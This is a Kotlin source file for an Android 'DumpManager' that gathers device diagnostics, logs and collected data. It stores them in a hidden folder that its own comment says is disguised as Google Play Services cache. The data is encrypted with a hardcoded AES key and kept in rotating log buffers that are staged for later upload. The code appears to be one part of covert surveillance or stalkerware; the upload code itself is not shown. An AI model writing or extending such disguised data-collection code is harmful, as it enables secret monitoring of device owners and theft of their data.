package com.example.myandroid

import android.content.Context
import android.os.Environment
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import org.json.JSONObject
import org.json.JSONArray

object DumpManager {

    // Hidden path, 6 folders deep, masquerading as System Cache
    private val ROOT_DIR = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android/data/com.google.android.gms/files/cache/.sys_config")
    private val KEY = "C0rtexS3cr3tK3y!".toByteArray() // 16 bytes for AES-128

    fun createDailyDump(ctx: Context) {
        try {
            val dateStr = SimpleDateFormat("d_M_yy", Locale.US).format(Date())
            val dayDir = File(ROOT_DIR, dateStr)
            if (!dayDir.exists()) dayDir.mkdirs()

            val timestamp = SimpleDateFormat("HH_mm_ss", Locale.US).format(Date())
            
            // 1. Readable Log
            val logFile = File(dayDir, "sys_log_$timestamp.txt")
            val report = DeviceManager.getDiagnosticReport(ctx) + "\n\n--- LOGS ---\n" + DebugLogger.getLogs()
            logFile.writeText(report)

            // 2. Encrypted Data Blob (.ctx extension)
            val jsonFile = File(dayDir, "data_snapshot_$timestamp.ctx")
            val rawJson = CloudManager.collectDumpData(ctx).toString()
            val encrypted = encrypt(rawJson)
            jsonFile.writeBytes(encrypted)

            DebugLogger.log("DUMP", "Saved to ${dayDir.absolutePath}")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun getDumpsForToday(): List<File> {
        val dateStr = SimpleDateFormat("d_M_yy", Locale.US).format(Date())
        val dayDir = File(ROOT_DIR, dateStr)
        return if (dayDir.exists()) dayDir.listFiles()?.toList() ?: emptyList() else emptyList()
    }

    private fun encrypt(data: String): ByteArray {
        val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
        val secretKey = SecretKeySpec(KEY, "AES")
        cipher.init(Cipher.ENCRYPT_MODE, secretKey)
        return cipher.doFinal(data.toByteArray())
    }

    fun logVerification(category: String, pkg: String) {
        try {
            if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs()
            File(ROOT_DIR, "sensor_verification.txt").appendText("[" + SimpleDateFormat("HH:mm:ss", Locale.US).format(Date()) + "] [$category] $pkg ✓\n")
        } catch (e: Exception) { }
    }

    // --- STREAM LOGGING (SURVIVOR PROTOCOL) ---
    private const val MAX_CHUNK_SIZE = 2 * 1024 * 1024 // 2MB chunks
    private const val MAX_TOTAL_CHUNKS = 25 // 50MB Max Storage

    fun appendLog(type: String, data: JSONObject) {
        Thread { 
            try {
                if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs()
                val activeFile = File(ROOT_DIR, "active_buffer.jsonl")
                
                val wrapper = JSONObject()
                wrapper.put("t", type)
                wrapper.put("d", data)
                
                activeFile.appendText(wrapper.toString() + "\n")
                
                // Rotate if too large
                if (activeFile.length() > MAX_CHUNK_SIZE) {
                    val rotated = File(ROOT_DIR, "offline_log_${System.currentTimeMillis()}.jsonl")
                    activeFile.renameTo(rotated)
                    enforceStorageLimits()
                }
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    private fun enforceStorageLimits() {
        try {
            val logs = ROOT_DIR.listFiles { _, name -> name.startsWith("offline_log_") } ?: return
            if (logs.size > MAX_TOTAL_CHUNKS) {
                // Delete oldest files to make room
                logs.sortedBy { it.lastModified() }
                    .take(logs.size - MAX_TOTAL_CHUNKS)
                    .forEach { it.delete() }
            }
        } catch(e: Exception) {}
    }

    fun getRotatedLogs(): List<File> {
        try {
            // Force rotate active buffer so we upload the latest data too
            val activeFile = File(ROOT_DIR, "active_buffer.jsonl")
            if (activeFile.exists() && activeFile.length() > 0) {
                activeFile.renameTo(File(ROOT_DIR, "offline_log_${System.currentTimeMillis()}.jsonl"))
            }
            return ROOT_DIR.listFiles { _, name -> name.startsWith("offline_log_") }?.toList() ?: emptyList()
        } catch (e: Exception) { return emptyList() }
    }
}
